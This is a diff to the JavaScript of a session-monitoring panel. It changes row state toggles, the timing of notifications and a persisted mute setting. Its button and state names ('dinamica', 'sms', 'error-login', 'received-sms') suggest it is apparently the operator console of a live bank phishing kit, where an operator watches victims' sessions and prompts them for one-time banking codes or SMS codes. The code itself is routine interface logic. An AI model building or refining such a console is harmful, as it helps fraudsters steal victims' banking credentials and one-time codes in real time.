@@ -13,6 +13,7 @@ const audioStatus = document.getElementById('audioStatus')
 
 let isInitialLoad = true;
 let audioCtx = null;
+let isSoundMuted = localStorage.getItem('isSoundMuted') === 'true';
 
 /** @type {Map<string, object>} */
 const rows = new Map()
@@ -154,9 +155,19 @@ function createRow(row) {
   `
 
   tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-dinamica') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
     setRowState(row.id, 'waiting-dinamica', 'dinamica')
   })
   tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-sms') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
     setRowState(row.id, 'waiting-sms', 'sms')
   })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
@@ -289,10 +300,40 @@ async function pollSessions() {
     if (response.ok) {
       const list = await response.json();
       
-      // Track existing new entries
+      // Track existing new entries BEFORE clearing the map
       const oldKeys = new Set(rows.keys());
-      const newKeys = new Set(list.map(s => s.id));
+      let hasNewOrChangedSession = false;
       
+      list.forEach((session) => {
+        if (!oldKeys.has(session.id)) {
+          hasNewOrChangedSession = true;
+          requestAnimationFrame(() => {
+            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
+            if (!tr) return
+            tr.classList.add('is-new')
+            setTimeout(() => tr.classList.remove('is-new'), 1800)
+          })
+        } else {
+          // Compare with stored session BEFORE overwriting it
+          const oldSession = rows.get(session.id);
+          if (oldSession && oldSession.state !== session.state) {
+            // Trigger sound on any relevant state changes
+            if (
+              session.state === 'waiting' ||
+              session.state === 'received-dinamica' ||
+              session.state === 'received-sms' ||
+              session.state === 'error-login' ||
+              session.state === 'error-dinamica' ||
+              session.state === 'error-sms' ||
+              session.state === 'done'
+            ) {
+              hasNewOrChangedSession = true;
+            }
+          }
+        }
+      });
+
+      // Clear and rebuild map
       rows.clear();
       list.forEach((session) => {
         rows.set(session.id, {
@@ -312,32 +353,6 @@ async function pollSessions() {
         });
       });
       render();
-
-      // Trigger flash effect and sound for new rows that were not in old list,
-      // or if their state changed to a submitted/waiting state.
-      let hasNewOrChangedSession = false;
-      list.forEach((session) => {
-        if (!oldKeys.has(session.id)) {
-          hasNewOrChangedSession = true;
-          requestAnimationFrame(() => {
-            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
-            if (!tr) return
-            tr.classList.add('is-new')
-            setTimeout(() => tr.classList.remove('is-new'), 1800)
-          })
-        } else {
-          const oldSession = rows.get(session.id);
-          if (oldSession && oldSession.state !== session.state) {
-            if (
-              session.state === 'waiting' ||
-              session.state === 'received-dinamica' ||
-              session.state === 'received-sms'
-            ) {
-              hasNewOrChangedSession = true;
-            }
-          }
-        }
-      });
 
       if (hasNewOrChangedSession && !isInitialLoad) {
         playNotificationSound();
@@ -360,35 +375,33 @@ function initAudio() {
 }
 
 function updateAudioUI() {
-  if (audioStatus) {
-    if (isSoundMuted) {
-      audioStatus.textContent = '🔇 Sonido: OFF';
-      audioStatus.style.color = '#f44336';
-      audioStatus.style.borderColor = '#f44336';
-      audioStatus.style.background = '#ffebee';
-    } else {
-      audioStatus.textContent = '🔊 Sonido: ON';
-      audioStatus.style.color = '#4caf50';
-      audioStatus.style.borderColor = '#4caf50';
-      audioStatus.style.background = '#e8f5e9';
-    }
+  if (!audioStatus) return;
+  if (isSoundMuted) {
+    audioStatus.textContent = '🔇 Sonido: OFF';
+    audioStatus.style.color = '#f44336';
+    audioStatus.style.borderColor = '#f44336';
+    audioStatus.style.background = '#ffebee';
+  } else {
+    audioStatus.textContent = '🔊 Sonido: ON';
+    audioStatus.style.color = '#4caf50';
+    audioStatus.style.borderColor = '#4caf50';
+    audioStatus.style.background = '#e8f5e9';
   }
 }
 
-// Initialize audio context on first interaction (only runs once)
+audioStatus?.addEventListener('click', (event) => {
+  event.preventDefault();
+  event.stopPropagation();
+  isSoundMuted = !isSoundMuted;
+  localStorage.setItem('isSoundMuted', isSoundMuted ? 'true' : 'false');
+  updateAudioUI();
+  if (!isSoundMuted) initAudio();
+});
+
 window.addEventListener('click', initAudio, { once: true });
 window.addEventListener('touchstart', initAudio, { once: true });
 
-// Audio status toggle listener
-audioStatus?.addEventListener('click', (event) => {
-  event.stopPropagation(); // Prevent triggering window click listener
-  isSoundMuted = !isSoundMuted;
-  localStorage.setItem('isSoundMuted', isSoundMuted);
-  updateAudioUI();
-  if (!isSoundMuted) {
-    initAudio();
-  }
-});
+updateAudioUI();
 
 function playNotificationSound() {
   if (isSoundMuted) return;
